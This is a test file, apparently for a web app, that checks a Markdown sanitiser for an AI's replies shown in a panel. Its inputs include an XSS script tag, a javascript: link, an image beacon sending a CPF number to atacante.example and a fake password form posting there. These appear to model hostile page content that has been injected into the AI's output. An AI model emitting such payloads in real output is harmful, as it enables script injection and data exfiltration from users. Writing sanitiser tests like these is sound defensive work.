import { JSDOM } from 'jsdom';
import { beforeAll, describe, expect, it } from 'bun:test';

let markdownSeguro: (md: string) => string;

beforeAll(async () => {
  // DOMPurify precisa de um DOM; jsdom é o que o próprio DOMPurify suporta (happy-dom não sanitiza).
  const { window } = new JSDOM('');
  Object.assign(globalThis, { window, document: window.document });
  ({ markdownSeguro } = await import('../utils/markdown'));
});

describe('markdownSeguro (resposta da IA no painel)', () => {
  it('mantém a formatação normal', () => {
    const html = markdownSeguro('**Pronto.** Confira:\n\n- Nome\n- `CEP`');
    expect(html).toContain('<strong>Pronto.</strong>');
    expect(html).toContain('<li>Nome</li>');
    expect(html).toContain('<code>CEP</code>');
  });

  it('remove script, handlers e javascript: vindos de página hostil', () => {
    const html = markdownSeguro('<script>alert(1)</script><a href="javascript:alert(1)" onclick="x()">clique</a>');
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onclick');
    expect(html).not.toContain('javascript:');
  });

  it('bloqueia imagem (beacon que vazaria dados) e formulário falso', () => {
    const html = markdownSeguro('![x](https://atacante.example/?cpf=123) <form action="https://atacante.example"><input name="senha"></form>');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('atacante.example/?cpf');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
  });

  it('links abrem fora do painel e sem referrer', () => {
    const html = markdownSeguro('[site](https://example.com)');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
  });
});
